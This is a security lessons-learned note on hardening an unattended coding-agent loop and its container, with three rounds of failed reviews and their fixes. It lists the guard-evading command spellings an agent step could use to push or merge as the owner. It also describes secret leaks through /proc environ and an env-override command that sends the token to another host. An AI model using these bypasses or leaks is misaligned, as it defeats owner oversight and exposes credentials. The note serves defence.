---
hits: 2
seen: [2026-11-15, 2026-11-15]
area: security
level: lesson
---
**Symptom (1, `splk loop` steps):** The first `splunk-security-review` found
that unattended steps could push or merge as the owner through spellings the
guard missed: `git -C . push`, bare `git push`, `gh -R x pr merge`, `gh.exe`,
`gh api .../merge`, a gh alias. Steps also inherited `.env` secrets (splk's
`load_env_file` puts them in `os.environ`), and the loop's own PR comment,
posted under the owner's login, would read back as owner feedback.
**Symptom (2, dev container for `splk loop`, three FAILED security reviews on
one branch):**
- Round 1: compose `env_file: .env` handed every variable (incl. the Splunk
  password) to the container; `unset` in the entrypoint does not clear
  `/proc/<pid>/environ`, which a same-uid step can read, so GH_TOKEN leaked.
- Round 2: a fixed `/tmp` secrets path (symlink plant, leftover file, crash
  loop under `cap_drop ALL` without DAC_OVERRIDE); and the tooling-changed
  check ran after `pip install -e` / `splk doctor` had already executed branch
  code with `.env` present.
- Round 3: new opt-in `SPLK_TARGET_*` env overrides were inherited by steps, so
  one command (`SPLK_TARGET_HOST=x SPLK_TARGET=server splk doctor`) sent the
  token to another host, or set allow_restart (no `.env` read, so the `.env`
  guard rule never fired).
**Cause:** Deny lists matched one spelling; child processes inherited the
parent's environment and credentials; identity-based trust (author == owner)
cannot tell agent from person. Then each *new configuration channel* (env var,
file path, mount) was added without asking "can an unattended step set or read
this?", and repo code ran before the integrity check that should gate it.
**Fix:** (1) `SPLK_LOOP=1` selects stricter hook rules; scrubbed step env;
loop comments carry a marker. (2) Explicit compose environment allow-list;
entrypoint starts as root, writes secrets into a root-owned tmpfs dir (0711,
rm + noclobber), then `setpriv` + `env -i` to the loop user with only
`CLAUDE_CODE_OAUTH_TOKEN`; git-only tooling check before writing `.env` or
running repo code. (3) Under `SPLK_LOOP=1`, `config.resolve_target` reads the
target name and overrides only from the `.env` file and refuses a different
`--target`; the entrypoint writes target settings to `.env`, not the env.
Playbook: `loop-secrets-across-privilege-drop`.
**Observed vs not:** reviews were by reading; nothing was built or run (no
Docker on the dev machine). Treat the container as unproven until it runs.
**Catch earlier:** Before shipping any new channel, list who can set it and who
can read it at step time. Same-uid secrets are speed bumps, not walls. Put
checks before the first execution of repo code. Test guards against variants
(`-C`, `-R`, `.exe`, `api`, aliases, env prefixes), not one spelling.
